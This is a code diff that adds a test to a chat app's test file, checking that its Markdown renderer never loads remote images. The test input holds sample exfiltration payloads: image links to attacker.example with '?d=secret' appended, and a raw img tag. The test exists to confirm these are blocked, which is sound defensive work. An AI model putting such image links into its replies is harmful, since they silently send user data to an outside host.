@@ -34,6 +34,7 @@ const { compactTranscript } = await import(pathToFileURL(join(output, 'lib/trans
 const { default: ChatApp } = await import(pathToFileURL(join(output, 'components/chat-app.js')).href)
 const { TooltipProvider } = await import(pathToFileURL(join(output, 'components/ui/tooltip.js')).href)
 const { default: PreviewPane } = await import(pathToFileURL(join(output, 'components/preview-pane.js')).href)
+const { default: Markdown } = await import(pathToFileURL(join(output, 'components/markdown.js')).href)
 const { default: NewChat } = await import(pathToFileURL(join(output, 'components/new-chat.js')).href)
 
 
@@ -223,4 +224,13 @@ test('account and sidebar HTML stream without waiting for the transcript', async
   resolveChat({ sessionId: 'chat', snapshot: { transcript: compactTranscript([{ type: 'text', seq: 1, turnId: 1, delta: 'Saved answer' }], { artifactRevision: 0 }), summary: null }, now: 1, missing: false })
   await ended
   assert.match(chunks.join(''), /Saved answer/)
+})
+
+test('reply text never loads a remote image', () => {
+  const html = renderToStaticMarkup(createElement(Markdown, null,
+    'Done\n\n![x](https://attacker.example/p.png?d=secret)\n\n[![y](https://attacker.example/q.png)](https://example.com)\n\n<img src="https://attacker.example/r.png">'))
+  assert.doesNotMatch(html, /<img|attacker\.example\/[pq]\.png|rel="preload"/)
+  assert.match(html, /&lt;img/)
+  assert.match(html, /<p>Done<\/p>/)
+  assert.match(html, /href="https:\/\/example\.com"/)
 })
